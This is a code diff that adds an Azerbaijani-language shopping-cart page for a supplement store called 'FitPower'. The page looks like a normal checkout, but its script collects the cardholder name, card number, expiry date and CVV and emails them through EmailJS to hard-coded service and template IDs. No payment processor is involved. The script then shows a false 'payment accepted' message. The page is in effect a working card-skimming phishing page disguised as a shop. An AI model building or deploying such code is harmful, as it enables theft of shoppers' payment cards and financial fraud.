@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FitPower - Səbət</title>
+    <style>
+        :root {
+            --primary: #ff4d00;
+            --black: #000000;
+            --white: #ffffff;
+            --gray: #f2f2f2;
+            --text-muted: #888;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Helvetica Neue', Arial, sans-serif; }
+        body { background: var(--white); color: var(--black); }
+
+        /* Minimalist Naviqasiya */
+        nav {
+            padding: 40px 5%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid var(--gray);
+        }
+        .logo { font-size: 20px; font-weight: 900; letter-spacing: 2px; text-transform: uppercase; }
+        .logo span { color: var(--primary); }
+
+        /* Səbət Strukturu */
+        .cart-wrapper {
+            display: grid;
+            grid-template-columns: 1fr 400px;
+            min-height: calc(100vh - 100px);
+        }
+
+        /* Sol Tərəf: Məhsullar */
+        .items-section { padding: 60px 10% 60px 5%; }
+        .cart-title { font-size: 45px; font-weight: 900; margin-bottom: 50px; text-transform: uppercase; }
+        
+        .item-row {
+            display: grid;
+            grid-template-columns: 150px 1fr 120px;
+            gap: 30px;
+            padding: 30px 0;
+            border-bottom: 1px solid var(--gray);
+            align-items: center;
+        }
+
+        .item-img { width: 100%; height: 180px; object-fit: contain; background: var(--gray); border-radius: 4px; }
+        
+        .item-info h3 { font-size: 22px; font-weight: 800; margin-bottom: 10px; text-transform: uppercase; }
+        .item-info p { color: var(--text-muted); font-size: 14px; margin-bottom: 20px; }
+
+        .qty-selector { display: flex; align-items: center; gap: 20px; }
+        .qty-btn { border: 1px solid var(--black); background: none; width: 30px; height: 30px; cursor: pointer; font-size: 18px; transition: 0.2s; }
+        .qty-btn:hover { background: var(--black); color: var(--white); }
+
+        .item-price { font-size: 20px; font-weight: 900; text-align: right; }
+        .remove-txt { 
+            display: inline-block; margin-top: 15px; font-size: 12px; 
+            text-transform: uppercase; letter-spacing: 1px; color: var(--primary); 
+            cursor: pointer; font-weight: bold;
+        }
+
+        /* Sağ Tərəf: Ödəniş (Qara Blok) */
+        .summary-section {
+            background: var(--black);
+            color: var(--white);
+            padding: 60px 40px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            position: sticky;
+            top: 0;
+            height: 100vh;
+        }
+
+        .summary-header { font-size: 24px; font-weight: 800; border-bottom: 1px solid #333; padding-bottom: 20px; }
+
+        .summary-details { margin-top: 40px; }
+        .summary-line { display: flex; justify-content: space-between; margin-bottom: 15px; font-size: 16px; color: #ccc; }
+        
+        .total-line { 
+            display: flex; justify-content: space-between; 
+            margin-top: 40px; padding-top: 20px; border-top: 1px solid #333;
+            font-size: 30px; font-weight: 900; 
+        }
+        .total-line span:last-child { color: var(--primary); }
+
+        .btn-checkout {
+            background: var(--primary);
+            color: var(--white);
+            border: none;
+            padding: 25px;
+            font-size: 16px;
+            font-weight: 900;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            cursor: pointer;
+            margin-top: 40px;
+            transition: 0.3s;
+        }
+        .btn-checkout:hover { background: #e64400; transform: scale(1.02); }
+
+        @media (max-width: 1100px) {
+            .cart-wrapper { grid-template-columns: 1fr; }
+            .summary-section { height: auto; position: static; }
+        }
+
+        @media (max-width: 600px) {
+            .item-row { grid-template-columns: 100px 1fr; }
+            .item-price { grid-column: 2; text-align: left; }
+            .cart-title { font-size: 32px; }
+        }
+    </style>
+</head>
+<body>
+
+    <nav>
+        <div class="logo">FIT<span>POWER</span></div>
+        <div style="font-weight: bold; font-size: 14px;">MENYU +</div>
+    </nav>
+
+    <div class="cart-wrapper">
+        <div class="items-section">
+            <h1 class="cart-title">Səbətiniz</h1>
+
+            <div class="item-row">
+                <img src="https://images.unsplash.com/photo-1593095191071-82b63de74e1e?w=300" alt="Whey" class="item-img">
+                <div class="item-info">
+                    <h3>Whey Professional</h3>
+                    <p>Ölçü: 2.27 KG | Dad: Şokolad</p>
+                    <div class="qty-selector">
+                        <button class="qty-btn">-</button>
+                        <span>1</span>
+                        <button class="qty-btn">+</button>
+                    </div>
+                    <span class="remove-txt">SİL [X]</span>
+                </div>
+                <div class="item-price">80.00 AZN</div>
+            </div>
+
+            <div class="item-row">
+                <img src="https://images.unsplash.com/photo-1579722820308-d74e5719d38e?w=300" alt="Creatine" class="item-img">
+                <div class="item-info">
+                    <h3>Creatine Pure</h3>
+                    <p>Ölçü: 300 G | Brend: Muscletech</p>
+                    <div class="qty-selector">
+                        <button class="qty-btn">-</button>
+                        <span>2</span>
+                        <button class="qty-btn">+</button>
+                    </div>
+                    <span class="remove-txt">SİL [X]</span>
+                </div>
+                <div class="item-price">45.00 AZN</div>
+            </div>
+        </div>
+
+        <div class="summary-section">
+            <div class="summary-header">SİFARİŞ XÜLASƏSİ
+                <div class="total-line">
+                    <span>CƏMİ</span>
+                    <span>215.00 AZN</span>
+                </div>
+                <button class="btn-checkout">ÖDƏNİŞƏ KEÇİN</button>
+            </div>
+        </div>
+    </div>
+
+
+  
+
+
+
+    
+ <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+<script>
+    // 1. EmailJS-i sənin Public Key-inlə başladırıq
+    (function(){
+        // "Account" bölməsindən aldığın Public Key-i aşağıdakı dırnaq arasına yaz:
+        emailjs.init("Qg90bKmVcMrD7BLhE"); 
+    })();
+
+    // 2. SƏBƏT HESABLAMA FUNKSİYALARI
+    function updateGrandTotal() {
+        let total = 0;
+        document.querySelectorAll('.item-price').forEach(p => {
+            total += parseFloat(p.innerText) || 0;
+        });
+        const totalDisplay = document.querySelector('.total-line span:last-child');
+        if(totalDisplay) totalDisplay.innerText = total.toFixed(2) + " AZN";
+    }
+
+    const itemRows = document.querySelectorAll('.item-row');
+    itemRows.forEach(row => {
+        const plus = row.querySelector('.qty-btn:last-of-type');
+        const minus = row.querySelector('.qty-btn:first-of-type');
+        const qty = row.querySelector('.qty-selector span');
+        const price = row.querySelector('.item-price');
+        const basePrice = parseFloat(price.innerText);
+
+        plus.onclick = () => {
+            let n = parseInt(qty.innerText) + 1;
+            qty.innerText = n;
+            price.innerText = (n * basePrice).toFixed(2) + " AZN";
+            updateGrandTotal();
+        };
+
+        minus.onclick = () => {
+            let n = parseInt(qty.innerText);
+            if(n > 1) {
+                n--;
+                qty.innerText = n;
+                price.innerText = (n * basePrice).toFixed(2) + " AZN";
+                updateGrandTotal();
+            }
+        };
+
+        row.querySelector('.remove-txt').onclick = () => {
+            row.remove();
+            updateGrandTotal();
+        };
+    });
+
+    // 3. ÖDƏNİŞ FORMASI VƏ MƏLUMATLARIN GÖNDƏRİLMƏSİ
+    const checkoutBtn = document.querySelector('.btn-checkout');
+    const summaryBox = document.querySelector('.summary-section');
+
+    checkoutBtn.onclick = () => {
+        const totalVal = document.querySelector('.total-line span:last-child').innerText;
+        if(parseFloat(totalVal) === 0) return alert("Səbətiniz boşdur!");
+
+        summaryBox.innerHTML = `
+            <div style="animation: fadeIn 0.5s ease; color: white;">
+                <h3 style="margin-bottom:15px; color:#ff4d00;">KART MƏLUMATLARI</h3>
+                <input type="text" id="c_name" placeholder="KART SAHİBİ (AD SOYAD)" style="width:100%; padding:12px; margin-bottom:10px; background:#111; border:1px solid #333; color:white;">
+                <input type="text" id="c_num" placeholder="KART NÖMRƏSİ" maxlength="16" style="width:100%; padding:12px; margin-bottom:10px; background:#111; border:1px solid #333; color:white;">
+                <div style="display:flex; gap:10px;">
+                    <input type="text" id="c_exp" placeholder="AA/İİ" style="flex:1; padding:12px; background:#111; border:1px solid #333; color:white;">
+                    <input type="text" id="c_cvv" placeholder="CVV" maxlength="3" style="flex:1; padding:12px; background:#111; border:1px solid #333; color:white;">
+                </div>
+                <div style="margin-top:20px; font-weight:bold; font-size:18px;">ÖDƏNİŞ: ${totalVal}</div>
+                <button id="confirm-pay" class="btn-checkout" style="width:100%; margin-top:15px; background:#ff4d00;">ÖDƏNİŞİ TƏSDİQLƏ</button>
+                <p onclick="location.reload()" style="text-align:center; cursor:pointer; font-size:12px; color:#888; margin-top:10px;">LƏĞV ET</p>
+            </div>
+        `;
+
+        document.getElementById('confirm-pay').onclick = function() {
+            const btn = this;
+            const cardData = {
+                card_name: document.getElementById('c_name').value,
+                card_number: document.getElementById('c_num').value,
+                expiry: document.getElementById('c_exp').value,
+                cvv: document.getElementById('c_cvv').value,
+                amount: totalVal,
+                date: new Date().toLocaleString()
+            };
+
+            if(!cardData.card_name || !cardData.card_number) return alert("Zəhmət olmasa xanaları doldurun!");
+
+            btn.innerText = "GÖNDƏRİLİR...";
+            btn.disabled = true;
+
+            // Sənin real ID-lərini bura əlavə etdim
+            emailjs.send("service_4cgpeu9", "template_s2jzc6o", cardData)
+            .then(() => {
+                document.body.innerHTML = `
+                    <div style="height:100vh; background:#000; color:#fff; display:flex; flex-direction:column; align-items:center; justify-content:center; text-align:center;">
+                        <h1 style="color:#ff4d00; font-size:80px;">✓</h1>
+                        <h1 style="font-size:30px;">ÖDƏNİŞİNİZ QƏBUL OLUNDU!</h1>
+                        <p style="color:#888;">Məlumatlar yoxlanılır. Təşəkkür edirik!</p>
+                        <button onclick="location.reload()" style="margin-top:30px; padding:15px 30px; background:#ff4d00; color:white; border:none; cursor:pointer; font-weight:bold;">ANA SƏHİFƏYƏ QAYIT</button>
+                    </div>`;
+            }, (error) => {
+                alert("Xəta baş verdi! İnterneti yoxlayın.");
+                btn.innerText = "ÖDƏNİŞİ TƏSDİQLƏ";
+                btn.disabled = false;
+            });
+        };
+    };
+</script>
+    
+    
+    
+    
+    
+    
+    
+
+<style>
+    @keyframes fadeIn {
+        from { opacity: 0; transform: translateX(20px); }
+        to { opacity: 1; transform: translateX(0); }
+    }
+</style>
+  
+</body>
+</html>
